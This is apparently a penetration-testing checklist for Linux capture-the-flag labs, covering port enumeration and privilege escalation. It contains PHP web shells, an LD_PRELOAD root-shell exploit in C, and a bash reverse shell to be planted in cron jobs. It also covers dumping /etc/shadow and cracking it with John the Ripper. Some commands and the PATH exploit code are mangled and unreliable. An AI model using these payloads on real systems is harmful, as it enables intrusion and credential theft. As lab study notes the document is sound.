1. Run NMAP
	1. All ports
	2. With safe scripts
2. Ports discovered
3. Enumerate ports from the top down
	1. If we are in a rabbit hole after 45-60 minutes, stop and go on to the next port / service. 
4. What's on port 21?
	1. Anonymous login
5. Port 80?
	1. Content Discovery
	2. Source code?
	3. Comments?
	4. Parameters?
	5. Software Versions?
	6. Running Wordpress?
	7. Exploit-DB?
	8. Reverse shells?
	9. Upload functionality?
	10. Php script to create parameter for LFI?
		a. <?php system($_GET["cmd"]);?>
		b. We can also upgrade and add obfuscation from  https://www.gaijin.at/en/tools/php-obfuscator
		<?php
		    $cmd = $_GET["ch1r0n1n"];
		    if(isset($cmd)){
		        echo "<pre>" . shell_exec($cmd) . "</pre>";
		    }
		    die();
		?>
	11. Use the obfuscator link with this code.
		a. This is a more secure shell in case our one-liner fails.
		b. Php reverse shell?
		c. Msfvenom?
	12. Nikto scan
6. Port 111 RPCBIND
	1. nmap -sSUC -p111
	2. Rpcinfo -p [IP]
7. Port 139,445 SMB
	1. Enum4linux
8. Other random ports
	1. What are listed as?
	2. How do they work?
	3. Are there exploits for them?

POST-EXPLOITATION:
9. What user are we?
	a. Whoami
10. What system?
	a. Hostname
11. Kernel?
	a. Uname -a
12. Permissions
	a. find / -perm -u=s -type f 2> /dev/null
13. check history
	a. history
14. Enumerate the network
	a. Ifconfig
	b. Ip route
	c. Route
	d. Arp -a
	e. Ip neigh
	f. Netstat -ano
15. Can we upload Linpeas?
	a. What can we manipulate?
16. Have gtfobins open.
17. Check for files with SUID bit set
	a. Find / -perm -u=s -type f 2> /dev/null
	b. find / -type f -perm -04000 -ls 2>/dev/null
18. Check for schedules tasks
	a. Cat /etc/crontab
19. Navigate to /tmp
20. Upload linpeas via file transfer
21. Set the execute permissions
	a. Chmod +x linpeas.sh
22. Run linpeas
	a. ./linpeas.sh
23. If we access the system via SSH, we can use sudo -l
24. Check the /etc/passwd file to see what users are on the system.
25. Run history to see all recent commands used on the system
26. Ifconfig will show the targets ip information
27. Ip route shows us the systems routing table
28. netstat -a: shows all listening ports and established connections.
29. netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
30. netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol
31. Netstat -ano
32. Use the find command to locate files on a system
LD_PRELOAD:
33. IF WE SEE THIS ON A SYSTEM, WE CAN SIMPLY CREATE A C SCRIPT TO ESCALATE
	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>
	
	void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
	}
34. Save the file and then compile it
	a. gcc -fPIC -shared -o shell.so shell.c -nostartfiles
35. Now run the program
	a. sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
SUID
36. List files with the SUID bit set
	a. find / -type f -perm -04000 -ls 2>/dev/null
	b. Take the binary results and use gtfobins to find an escalation.
37. If we are root we can create a new user and password salt with openssl
	a. Openssl passwd -1 -salt THM password1
	b. Add this to the /etc/passwd file
	c. Switch to our new user
38. If we want, if we find that base64 has SUID bit set, we can use that to make a copy of the /etc/shadow and /etc/passwd file.
	a. Base64 /etc/shadow | base64 --decode
	b. Base64 /etc/passwd | base64 --decode
	c. base64 /home/ubuntu/flag3.txt | base64 --decode
39. Use unshadow to combine the 2 files making it easier for John the Ripper to crack it.
	a. Unshadow passwd.txt shadow.txt > passwords.txt
	b. john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
CAPABILITIES
40. We can use the command getcap to list enabled capabilities on the system
	a. Getcap -r / 2>/dev/null
	b. These we can simply run with the power of root to do what we want. 
CRON JOBS
41. Cat /etc/crontab
	a. This will list all of the scheduled tasks.
	b. Check if there are script files we can edit where it contains a reverse shell script. Or we can create a backup of this file and re-create our own.
		a. Bash -I >& /dev/tcp/IP/PORT 0>&1
	c. Start a nc listener on our machine and wait for the reverse shell to be triggered.
PATH
42. Echo $PATH
	a. This is an environmental variable that that tells the OS where to search for executables.
	b. We could compile a binary that has the SUID bit set
		a. #include<unistd.h>
		b. Void main()
		c. {   setuid(0);
		d.     setgid(0);
		e.     system("ch1ron1n")
	c. Save this as path_exp.c
	d. Now compile
		a. Gcc path_exp.c -o path -w
	e. Set the permissions
		a. Chmod u+s
43. If any writable folder is listed under PATH we could create a binary under that directory and have our path script run it.
44. We can search for writable folders via:
	a. find / -writable 2>/dev/null
	b. OR
	c. find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
45. Would be easier to set it to /tmp
	a. Export PATH=/tmp:$PATH
	b. Don't forget to look for out of place folders we could use as well. 
NFS
46. Cat /etc/exports
47. Enumerate mountable shares from our machine
	a. Showmount -e [IP]
48. Create a temp directory to use as a mount point
	a. Mkdir [DIRECTORY NAME]
49. Mount the folder
	a. Mount -o rw [IP]:/[FOLDER] /[path to our folder]
